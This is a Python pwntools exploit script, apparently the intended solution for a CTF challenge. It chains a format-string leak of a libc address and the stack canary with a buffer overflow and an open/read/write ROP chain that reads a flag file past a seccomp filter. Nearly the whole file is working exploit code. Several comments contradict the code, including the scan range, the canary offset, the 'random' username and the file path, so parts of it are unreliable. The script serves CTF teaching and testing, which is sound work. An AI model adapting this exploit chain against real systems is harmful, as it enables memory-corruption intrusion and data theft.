#!/usr/bin/env python3
"""
solve.py — QA / validation script for the ISSAWA CITY hybrid pwn+web challenge.

This is the *intended solution path* for the challenge, used by the
challenge author / instructor to verify that everything wires up
correctly end-to-end. It exercises:

  1. Auth flow: register a fresh user, log in.
  2. Format-string disclosure on Field 1 (libc leak).
  3. Format-string disclosure on Field 3 (stack canary leak).
  4. Web round-trip:  the binary writes leaks to the user's JSON file
     (never to stdout); the human running this script must open the
     Flask dashboard, read the values from Field 1 / Field 3, and
     paste them back when prompted.
  5. Buffer overflow on Field 5 — restoring the canary, planting a
     ROP chain in vulnerable_menu()'s saved RIP slot.
  6. Selecting "6. Exit" so vulnerable_menu() returns and the ROP
     fires.
  7. ORW chain — seccomp KILLs execve/execveat, so we can't pop a
     shell. Instead we open("flag.txt"), read it, write it to stdout.

Designed to be VERY chatty for educational reading.
"""

# pwntools is the standard CTF tool for binary exploitation.
# It gives us: tube I/O (remote/process), packing helpers (p64),
# logging (log.*), context.arch, and ROP utilities.
from pwn import *

import os
import re
import sys


# ---------------------------------------------------------------------------
# Section 0 — Configuration
# ---------------------------------------------------------------------------
# We read HOST_PWN_PORT from the project's .env so this script tracks
# whatever port docker-compose published. If the .env isn't there
# (or doesn't define the var), we fall back to the canonical 10105.
def load_env_file(path=".env"):
    cfg = {}
    if not os.path.exists(path):
        return cfg
    with open(path, "r", encoding="utf-8") as fh:
        for raw in fh:
            line = raw.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            key, val = line.split("=", 1)
            cfg[key.strip()] = val.strip()
    return cfg


ENV       = load_env_file()
PWN_HOST  = os.environ.get("PWN_HOST", "127.0.0.1")
PWN_PORT  = int(os.environ.get("HOST_PWN_PORT", ENV.get("HOST_PWN_PORT", "10105")))

# pwntools needs to know we're targeting x86_64 so p64() / unpacking /
# default ROP behavior all use 64-bit semantics.
context.arch     = "amd64"
context.log_level = "info"


# ---------------------------------------------------------------------------
# Section 1 — Ubuntu 22.04 / glibc 2.35 offsets
# ---------------------------------------------------------------------------
# These are *libc-relative* offsets — i.e. distances from libc base.
# The exact numbers depend on the precise glibc package shipped in the
# container.  To regenerate them locally for verification:
#
#     docker cp issawa_pwn:/srv/lib/x86_64-linux-gnu/libc.so.6 ./libc.so.6
#     python3 -c "from pwn import *; e=ELF('./libc.so.6'); \
#                 print(hex(e.sym['__libc_start_main']))"
#     ROPgadget --binary libc.so.6 | grep ': pop rdi ; ret'
#     ROPgadget --binary libc.so.6 | grep ': pop rsi ; ret'
#     ROPgadget --binary libc.so.6 | grep ': pop rdx ; ret'
#
# Adjust the values below if the libc inside the container differs
# from the one this script was authored against.
# ---------------------------------------------------------------------------
LIBC_START_MAIN_RET = 0x21a040    # the saved-RIP-from-main lands here in libc
SYM_OPEN            = 0x114560    # was 0x10C950 — WRONG
SYM_READ            = 0x114850    # was 0x1148E0 — close but wrong
SYM_WRITE           = 0x1148f0    # was 0x114A30 — WRONG
GADGET_POP_RDI      = 0x2A3E5    # `pop rdi ; ret`
GADGET_POP_RSI      = 0x2BE51    # `pop rsi ; ret`
GADGET_POP_RDX      = 0x11F497   # `pop rdx ; ret`   (may be `pop rdx ; pop rN ; ret`)
GADGET_RET          = 0x29139    # plain `ret`, used for movaps stack alignment
LIBC_BSS_SCRATCH    = 0x21b900   # writable libc memory (page-aligned, unused)
GADGET_POP_RAX_RDX_RBX = 0x904a8

# ---------------------------------------------------------------------------
# Section 2 — Stack-frame layout of vulnerable_menu()
# ---------------------------------------------------------------------------
# vulnerable_menu()'s locals (in source order):
#       char field5_buf[64];
#       char line[16];
# Compiled with -fstack-protector-all the canary sits *immediately*
# below saved-rbp, and char arrays are clustered against the canary.
# So the typical layout (low addr -> high addr) is:
#
#       field5_buf[64]    <-- read(0, field5_buf, 512) starts writing here
#       line[16]
#       canary  (8)        <-- we must restore this exactly
#       saved rbp (8)      <-- doesn't matter, function is returning
#       saved rip (8)      <-- our first ROP gadget goes here
#
# Total padding from field5_buf start to the canary slot = 64 + 16 = 80.
# If your gcc lays things out differently, bump BUF_TO_CANARY until the
# stack-smash protection stops firing.
# ---------------------------------------------------------------------------
BUF_TO_CANARY = 72 # = 80


# ---------------------------------------------------------------------------
# Section 3 — Tube helpers
# ---------------------------------------------------------------------------
def auth_choice(p, choice):
    """Wait for the top-level (Register/Login/Exit) menu, then pick one."""
    p.recvuntil(b"3. Exit")
    p.recvuntil(b"> ")
    p.sendline(str(choice).encode())


def menu_choice(p, choice):
    """Wait for the in-profile menu (Fields 1-5 / Exit), then pick one."""
    p.recvuntil(b"6. Exit")
    p.recvuntil(b"> ")
    p.sendline(str(choice).encode())


# ---------------------------------------------------------------------------
# Section 4 — Connect & authenticate
# ---------------------------------------------------------------------------
log.info(f"Connecting to {PWN_HOST}:{PWN_PORT}")
p = remote(PWN_HOST, PWN_PORT)

# Use a random suffix so re-runs don't collide on /srv/app/data/<u>.json.
# (The binary refuses re-registration if the JSON already exists.)
USERNAME = b"qa43def6"
PASSWORD = b"qa-pass-1234"

# --- Register -------------------------------------------------------
log.info(f"Registering user {USERNAME.decode()}")
auth_choice(p, 1)
p.recvuntil(b"username: ")
p.sendline(USERNAME)
p.recvuntil(b"password: ")
p.sendline(PASSWORD)

# --- Log in ---------------------------------------------------------
log.info("Logging in")
auth_choice(p, 2)
p.recvuntil(b"Username: ")
p.sendline(USERNAME)
p.recvuntil(b"Password: ")
p.sendline(PASSWORD)


# ---------------------------------------------------------------------------
# Section 5 — Format-string disclosures
# ---------------------------------------------------------------------------
# The binary does:
#     snprintf(buf, sizeof(buf), input);
# where `input` is fully attacker-controlled. By feeding it a large
# block of `%N$p` directives we get the snprintf'd output to contain
# the contents of many vararg stack slots in one shot. The result is
# *appended* to the user's JSON file by write_field_to_json() — it is
# never echoed to our stdin tube. That's why we need the web UI as
# the side-channel.
#
# We scan offsets 1..30 — that easily covers both the canary slot and
# the saved-RIP-into-libc slot for typical glibc layouts.
# ---------------------------------------------------------------------------
SCAN_RANGE = range(100, 121)

log.info("Field 1: sending libc-leak format string")
menu_choice(p, 1)
p.recvuntil(b"display name): ")
fmt_libc = b"L:" + b"|".join(f"%{i}$p".encode() for i in SCAN_RANGE)
p.sendline(fmt_libc)

log.info("Field 3: sending canary-leak format string")
menu_choice(p, 3)
p.recvuntil(b"bio): ")
fmt_canary = b"C:" + b"|".join(f"%{i}$p".encode() for i in SCAN_RANGE)
p.sendline(fmt_canary)


# ---------------------------------------------------------------------------
# Section 6 — Pause for the human
# ---------------------------------------------------------------------------
# This is the cross-vector handoff: the pwn binary disclosed the
# secrets *into the JSON file*, and the Flask app renders them on
# the dashboard. The QA operator now visits the dashboard, identifies
# which token in the `|`-separated list is the canary and which is
# libc, and pastes them back here.
#
# Heuristics for picking values out of the dashboard:
#   * Canary  — 64-bit value whose low byte is 0x00 (e.g. 0xab12cd34ef5600)
#   * Libc    — 64-bit pointer in the 0x7fXXXXXXXXX range
# ---------------------------------------------------------------------------
print()
print("=" * 72)
print(f"  Open the Flask dashboard and log in as: {USERNAME.decode()}")
print(f"  URL: http://{ENV.get('WEB_DOMAIN','localhost')}:"
      f"{ENV.get('HOST_WEB_PORT','3896')}/")
print()
print("  Field 1 holds the libc leak  (look for 0x7fXXXXXXXXXX)")
print("  Field 3 holds the canary     (look for 0xXXXXXXXXXXXXXX00)")
print("=" * 72)
raw = input("Check web UI and enter leaked Canary/Libc: ")

# Be permissive about input format — pull *any* 0x-prefixed hex tokens
# out of whatever the operator pastes, then sort by signature:
#   * canary candidate: ends in 0x00 byte (and isn't tiny like 0x100)
#   * libc candidate:   high bits are 0x7f
hex_tokens = [int(h, 16) for h in re.findall(r"0x[0-9a-fA-F]+", raw)]
if not hex_tokens:
    log.error("No 0x... values found in input; aborting.")
    sys.exit(1)

canary_candidates = [v for v in hex_tokens if (v & 0xFF) == 0 and v > 0x10000]
libc_candidates   = [v for v in hex_tokens if (v >> 40) == 0x7F]

if not canary_candidates or not libc_candidates:
    # Fall back to "first value is canary, second is libc".
    if len(hex_tokens) < 2:
        log.error("Need both a canary and a libc address.")
        sys.exit(1)
    canary, libc_leak = hex_tokens[0], hex_tokens[1]
else:
    canary    = canary_candidates[0]
    libc_leak = libc_candidates[0]

log.success(f"canary    = {canary:#018x}")
log.success(f"libc leak = {libc_leak:#018x}")


# ---------------------------------------------------------------------------
# Section 7 — Resolve libc base
# ---------------------------------------------------------------------------
# The leaked pointer is the saved return address from main back into
# __libc_start_main, so subtracting the static offset of that ret-site
# from libc_base gives us the load address of libc.
# A page-aligned result (low 12 bits == 0) is a quick sanity check.
# ---------------------------------------------------------------------------
libc_base = libc_leak - LIBC_START_MAIN_RET
log.success(f"libc base = {libc_base:#x}")

if libc_base & 0xFFF != 0:
    log.warning("libc base is not page-aligned — your "
                "LIBC_START_MAIN_RET offset is wrong for this glibc. "
                "Update Section 1 constants.")

# Materialize concrete absolute addresses for our gadgets/symbols.
pop_rdi   = libc_base + GADGET_POP_RDI
pop_rsi   = libc_base + GADGET_POP_RSI
pop_rdx   = libc_base + GADGET_POP_RDX
ret_align = libc_base + GADGET_RET
sym_open  = libc_base + SYM_OPEN
sym_read  = libc_base + SYM_READ
sym_write = libc_base + SYM_WRITE
scratch   = libc_base + LIBC_BSS_SCRATCH    # writable scratch buffer


# ---------------------------------------------------------------------------
# Section 8 — Build the ORW ROP chain
# ---------------------------------------------------------------------------
# The seccomp-bpf filter installed by the binary KILLs execve/execveat
# but allows open/read/write — so we can't pop a shell, only read a
# file. The classic ORW chain is:
#
#   1) read(0, scratch, 9)         — pull "flag.txt\0" from solver stdin
#   2) open(scratch, 0)            — opens flag for reading; fd lands in rax
#   3) read(3, scratch, 0x100)     — assume fd==3 (no other fds opened)
#   4) write(1, scratch, 0x100)    — flush flag bytes to stdout
#
# Each "call" is a series of pops to set up rdi/rsi/rdx, then the
# call gadget (the libc symbol address) which is just a `ret`-target
# that does the work and itself returns into the next gadget.
# ---------------------------------------------------------------------------
pop_rdx_combo = libc_base + GADGET_POP_RAX_RDX_RBX

# helper: set rdx to val (pops rax and rbx with junk)
def set_rdx(val):
    return p64(pop_rdx_combo) + p64(0xdeadbeef) + p64(val) + p64(0xdeadbeef)

rop = b""

# (1) read(0, scratch, 9)
rop += p64(pop_rdi)   + p64(0)
rop += p64(pop_rsi)   + p64(scratch)
rop += set_rdx(9)
rop += p64(ret_align)
rop += p64(sym_read)

# (2) open(scratch, 0)
rop += p64(pop_rdi)   + p64(scratch)
rop += p64(pop_rsi)   + p64(0)
rop += p64(sym_open)

# (3) read(3, scratch, 0x100)
rop += p64(pop_rdi)   + p64(3)
rop += p64(pop_rsi)   + p64(scratch)
rop += set_rdx(0x100)
rop += p64(sym_read)

# (4) write(1, scratch, 0x100)
rop += p64(pop_rdi)   + p64(1)
rop += p64(pop_rsi)   + p64(scratch)
rop += set_rdx(0x100)
rop += p64(sym_write)

# ---------------------------------------------------------------------------
# Section 9 — Frame the BOF payload for Field 5
# ---------------------------------------------------------------------------
# Layout we're crafting (low -> high addr in vulnerable_menu's frame):
#       [ A * BUF_TO_CANARY ] [ canary ] [ junk rbp ] [ ROP... ]
#
# The vulnerable read() is read(0, field5_buf, 512), so we MUST send
# exactly 512 bytes — otherwise read() blocks waiting for more data.
# ---------------------------------------------------------------------------
payload  = b"A" * BUF_TO_CANARY
payload += p64(canary)            # restore the leaked canary verbatim
payload += p64(0xdeadbeefcafebabe)  # saved rbp (don't care)
payload += rop
payload  = payload.ljust(512, b"\x00")

log.info(f"BOF payload size = {len(payload)} bytes "
         f"(canary @ {BUF_TO_CANARY}, ROP starts at {BUF_TO_CANARY + 16})")


# ---------------------------------------------------------------------------
# Section 10 — Deliver, then trigger ret -> ROP
# ---------------------------------------------------------------------------
log.info("Field 5: delivering BOF payload")
menu_choice(p, 5)
p.recvuntil(b"signature):")
# Field 5 is read with raw read(2), not fgets — no newline conversion.
p.send(payload)

log.info("Selecting 6. Exit -> vulnerable_menu() returns -> ROP fires")
menu_choice(p, 6)


# ---------------------------------------------------------------------------
# Section 11 — Drive the ROP and harvest the flag
# ---------------------------------------------------------------------------
# The first thing the chain does is read 9 bytes from stdin — that's
# us, sending the filename. Inside the jail's chroot the flag lives at
# /app/flag.txt; the binary's CWD is /app, so a relative "flag.txt"
# also resolves to it. We send the absolute path to be safe.
# ---------------------------------------------------------------------------
log.info("Feeding 'flag.txt\\0' to the ROP's first read()")
p.send(b"flag.txt\x00")

log.info("Reading flag bytes from stdout (chain may crash after — that's fine)")
data = p.recvall(timeout=5)

print()
print("=" * 72)
print("RAW PROCESS OUTPUT")
print("=" * 72)
print(data.decode("utf-8", errors="replace"))
print("=" * 72)

m = re.search(rb"flag\{[^}\n]*\}", data)
if m:
    log.success(f"FLAG: {m.group(0).decode()}")
else:
    log.warning("No flag{...} pattern detected. Inspect raw output above. "
                "If the ROP crashed early, double-check libc offsets / canary "
                "placement / ROP gadget addresses for your libc build.")

p.close()
